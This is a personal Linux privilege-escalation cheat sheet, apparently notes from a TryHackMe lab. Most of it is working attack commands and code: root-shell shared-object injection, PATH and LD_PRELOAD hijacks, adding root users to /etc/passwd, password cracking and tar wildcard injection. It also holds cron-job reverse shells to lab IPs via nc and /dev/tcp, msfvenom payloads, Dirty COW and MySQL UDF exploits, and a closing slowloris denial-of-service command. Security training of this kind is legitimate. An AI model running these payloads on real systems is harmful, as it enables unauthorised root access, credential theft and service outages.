https://tryhackme.com/room/linuxprivesc
# Enumeration for Priv Esc Oppurtunities

## Initial commands to use

find hostname
`hostname`

kernel info
`uname -a`
may give you kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
`/proc/version`
OS info
`cat /etc/issue`

processes tree
`ps axjf`
show which user launch processes and processes not attached to a terminal
`ps aux

show env variables
`env`

shows commands that run with root privileges 
priv esc using gtfo bins under the 'sudo' heading 
`sudo -l`

show id
`id`

users pass file
`/etc/passwd
filters for users
`cat /etc/passwd | cut -d ":" -f 1
`cat /etc/passwd | grep home

show used commands
``history``

command will give us information about the network interfaces
`ifconfig` 

lists ports in listening mode 
`netstat -ltp`

try open rootshell
`/bin/bash -p`

SUID GUID bit set files
`find / -type f -perm -04000 -ls 2>/dev/null`

capabilities
`getcap -r / 2>/dev/null



## Find

**Find files:**

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size
- `find / -size +50M`: find files larger than 50 MB size
- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

>The “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with `-type f 2>/dev/null`

contains ssh configurations such as: PasswordAurhentication
	`etc/ssh/ssshd_config
A plain text file It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
	`/etc/passwd` 



## Find all SUID/GUID executables
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
OR
`find / -perm /4000 2> /dev/null`
OR
`find / -user root -perm -4000 -exec ls -ldb {} \;
OR
`find / -perm -u=s -type f 2>/dev/null
## SSH Keys
On Linux ideally we would be looking for opportunities to gain access to a user account. 
SSH keys stored at `/home/<user>/.ssh` 

In CTFs it's also not infrequent to find credentials lying around somewhere on the box. 

Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

shows current users permissions
`sudo -l

## LSE.sh

Linux Smart Enumeration Tool
https://github.com/diego-treitos/linux-smart-enumeration

Direct execution oneliners

```shell
bash <(wget -q -O - "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh") -l2 -i
```

```shell
bash <(curl -s "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh") -l1 -i
```




## LinPEAS

first ssh into ip THEN
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

OR 
```
scp LinEnum/linpeas.sh jan@10.10.37.200:/dev/shm
```

## LinEnum

[LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

There are two ways to get LinEnum on the target machine. 

1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab thfile from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
2. if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**.

Start a server from the directory that contains LinEnum.sh
```bash
(raz㉿kali)-[~/LinEnum]
└─$ python -m http.server 9000
```
1. from the target use `wget http://10.4.3.201:9000/LinEnum.sh
3. `chmod +x LinEnum.sh
4. Run `./LinEnum.sh` to begin scan

## RootHelper

The RootHelper/Linux Smart Enumeration module is a LinEnum fork with a heavy focus on privilege escalation.
https://github.com/NullArray/RootHelper



---
# Priv Esc Exploits 

## Unshadow Tool

the unshadow tool to create a file crackable by John the Ripper. 
`unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.
`unshadow passwd.txt shadow.txt > passwords.txt`
Then use john to crack
`john passwords.txt`

## Use Nano to create a new user with Root Privileges 

Create the hash value of the password we want the new user to have
`openssl passwd -1 -salt THM password1`
add this password with a username to the `/etc/passwd` file.
`echo "hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:bin/bash" >> /etc/passwd
switch to new user
`su hacker`
## Exploiting SUID Files

### Find all SUID/GUID executables
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

SUID files: Look like
`-rwsr-xr-x
Notice the ***'S'***

ctrl+F to find this part of your LinEnum scan

## SUID files:
-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user3/shell
```
OR
Use this command to search the system for SUID/GUID files:
```
find / -perm -u=s -type f 2>/dev/null
```

Google exploits for SUID binaries e.g. [exim-4.84-3](https://www.exploit-db.com/exploits/39535)

### SUID / SGID Executables - Shared Object Injection

`usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection

1. Run **strace** on the file and search the output for open/access calls and for "no such file" errors:
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`
2. Create the **.config** directory for the missing libcalc.so file:
`mkdir /home/user/.config`
3. Compile  code that will spawn a bash shell into a shared object at the location the **suid-so** executable was looking for it:
```c
user@debian:~$ cat /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
4. Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.
`/usr/local/bin/suid-so`

### SUID / SGID Executables - Environment Variables

```shell
user@debian:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

1. First, execute the file and note that it seems to be trying to start the apache2 webserver:
`/usr/local/bin/suid-env`
2. Run strings on the file to look for strings of printable characters:
`strings /usr/local/bin/suid-env`
3. One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
4. Create a file called service. This code simply spawns a Bash shell:
```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
5. compile program `gcc -o service /home/user/tools/suid/service.c
6. Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
`PATH=.:$PATH /usr/local/bin/suid-env`

### SUID / SGID Executables - Abusing Shell Features

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:
`strings /usr/local/bin/suid-env2   `

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
`/bin/bash --version`

1. Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
`function /usr/sbin/service { /bin/bash -p; }   
`export -f /usr/sbin/service`
2. Run the suid-env2 executable to gain a root shell:
`/usr/local/bin/suid-env2`

### SUID / SGID Executables - Abusing Shell Features (#2)

>**Note:** This will not work on Bash versions 4.4 and above.

1. Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
2. Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
`/tmp/rootbash -p`

## Passwords & Keys - Files

### History
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
`cat ~/.*history | less`

### Misc Config Files
Config files often contain passwords in plaintext or other reversible formats.
List the contents of the user's home directory:
`ls /home/user`
Note the presence of a **myvpn.ovpn** config file. View the contents of the file:
`cat /home/user/myvpn.ovpn`
The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
`su root`

### SSH Keys
Sometimes users make backups of important files but fail to secure them with the correct permissions.
1. Look for hidden files & directories in the system root:
`ls -la /`
Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:
`ls -l /.ssh`
2. Copy the key over to your Kali box (it's easier to just view the contents of the **root_key** file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
`chmod 600 root_key`
3. Use the key to ssh as the root account (note that due to the age of the box, some additional settings are required when using SSH):
`ssh -i root_key root@10.10.69.9`




## Exploiting a writable /etc/passwd

example entry of a user
`test:x:0:0:root:/root:/bin/bash

1. create a compliant password hash to add to our new user
`openssl passwd -1 -salt [salt] [password]
2. create a user entry to add onto /etc/passwd
```
nano /etc/passwd
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash"
```
3. switch to your new user and enter passwd
`su new`
4. you should have root
`sudo -i


## Escaping Vi Editor

use `sudo -l` to discover if that user can run any binaries with root privileges

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions

1. open vi as root, by typing `sudo vi`
2. type `:!sh` to open a shell!



## Exploiting Crontab

view scheduled cron jobs
`cat /etc/crontab

crontabs have the following format:
`<ID> <minute> <hour> <day of month> <month> <day of week> <user> <command>

1. create a reverse shell payload for the cronjob to run 
`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
2. replace the binary that is called with cron, with the payload
`echo "mkfifo /tmp/ujlow; nc 10.4.3.201 8888 0</tmp/ujlow | /bin/sh >/tmp/ujlow 2>&1; rm /tmp/ujlow" > cronscript.sh`
3. start listener and wait for shell to land
`nc -lvnp 8888`

OR

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
```shell
#!/bin/bash  
bash -i >& /dev/tcp/10.4.61.7/9001 0>&1
```

### Cron PATH Variable

If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file

Search the PATH variable and see taht it starts with **/home/user** which is our user's home directory.
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
there is a job containing:
` * * * * * root overwrite.sh

- Create a file called **overwrite.sh** in your home directory with the following contents:
`#!/bin/bash  
`cp /bin/bash /tmp/rootbash  
`chmod +xs /tmp/rootbash
			**Make sure that the file is executable:**
`chmod +x /home/user/overwrite.sh`

- Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
`/tmp/rootbash -p`

### Wildcards


use `cat etc/crontab`
Note that a [tar command](https://gtfobins.github.io/gtfobins/tar/) is being run with a wildcard (*) in your home directory.
```shell
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

1. Use msfvenom  to generate a reverse shell ELF binary `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
2. Transfer the shell.elf file to `/home/user/` using scp or hosting a webserver on your box and using wget
3. Make sure the file is executable: `chmod +x /home/user/shell.elf`
4. Create these two files in /home/user:
```shell
touch /home/user/--checkpoint=1   
touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
5. Set up a netcat listener and wait for the cronjob to run `nc -nvlp 4444`


## Exploiting PATH Variable


Typically the PATH will look like this: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm.

view the Path of the relevant user `echo $PATH`

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

### Exploit Steps 

1. find a program that runs an SUID binary such as `ls` or `curl` using
2. use `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u` to find writable folders
1. create an imitation executable in a writable folder
`cd /tmp`
`echo "/bin/bash" > ls`
`chmod +x ls`
3.  change the PATH variable, so that it points to the directory where we have our imitation **"ls"** stored
`export PATH=/tmp:$PATH`
4. run the script and you should have root

you can use `strings [SUID program]` to quickly determine if  any commands are being run with out a full path e.g `curl -I localhost` instead of `/usr/bin/curl -I localhost`

OR



## Exploit Services 

If MySQL service is running as root and the "root" user for the service does not have a password assigned We can use [raptor_udf2.c,v 1.1](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)

Compiles exploit
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
```
Uses MYSQL to create a bash executable in the /tmp/ directory
```
use mysql;   
create table foo(line blob);   
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));   select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   
create function do_system returns integer soname 'raptor_udf2.so';`

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MYSQL shelll using `exit` then run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```


## Capabilities

find binaries that have the `CAP SETUID` option set
`getcap -r / 2>/dev/null
Search GTFOBINS under the "Capabilities" Headers


## Weak File Permissions

### Readable `/etc/shadow` allows you to crack password Hashes

Normal shadow file permissions:
```shell
-rw-r----- 1 root shadow 1474 Dec 17 20:46 /etc/shadow

```
Read/Writeable shadow file permissions:
```shell
~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
## Writeable `/etc/shadow`  

- Generate a new password hash with a password of your choice: `mkpasswd -m sha-512 newpasswordhere`
- Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
- Switch to the root user, using the new password: `su root`

## Writable /etc/passwd

- Generate a new password hash with a password of your choice: `openssl passwd newpasswordhere`
- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
- Switch to the root user, using the new password: `su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  

Now switch to the newroot user, using the new password: `su newroot`


## Shell escape

https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/

- List the programs which sudo allows your user to run: `sudo -l`
- Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges


## Environment Variables

1. Check which environment variables are inherited (look for the env_keep options): `sudo -l`
`env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
2. Create a shared object using the code located at /home/user/tools/sudo/preload.c:
`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
3. Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
`sudo LD_PRELOAD=/tmp/preload.so program-name-here`
4. A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
5. Run ldd against the apache2 program file to see which shared libraries are used by the program:
`ldd /usr/sbin/apache2`
6. Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
7. Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
`sudo LD_LIBRARY_PATH=/tmp apache2`

## NFS

### NFS shares

1. shows visible NFS shares on that IP 
    ```
    (FROM THE ATTACKING MACHINE)
    showmount -e [IP]
	
	(OR  from the target machine)
	cat /etc/exports
	```
If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

1. mounts the share from "IP:share" to the directory "/tmp/mount"
    ```
    (from the attacking machine)
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
3. Download Bash executable  
```
get https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -P ~/Downloads
```
4. Copy it to the NFS mount poin
```
cp ~/Downloads/bash ~/share
```
5. Step Change its permissions    
```
sudo chmod +s bash
sudo chmod +x bash
file should have "-rwsr-sr-x" as permissions
```
6. ssh into the machine that now holds the bash executable and run the executable using
```
./bash -p
```
7. You should now have a shell as "root"

### NFS NFS Files

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

1. Check the NFS share configuration on the Debian VM:
`cat /etc/exports`
Note that the **/tmp** share has root squashing disabled.
`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
2. On your Kali box, switch to your root user if you are not already running as root:
`sudo su`
3. Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):
`mkdir /tmp/nfs   mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
4. Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
5. Still using Kali's root user, make the file executable and set the SUID permission:
`chmod +xs /tmp/nfs/shell.elf`


## Kernel Exploits

1. Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:
`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
2. Compile the code and run the dirty c0w exploit (note that it may take several minutes to complete):
`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w   ./c0w`
3. Once the exploit completes, run /usr/bin/passwd to gain a root shell:
`/usr/bin/passwd`




---

# Priv Esc Tools
- https://tryhackme.com/room/linuxprivesc
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

---
## Windows 

VNC servers, for example, frequently leave passwords in the registry stored in plaintext. 

Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
- These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

---

# Now you're Here..

launche DOS attack using nmap scripts
`nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true

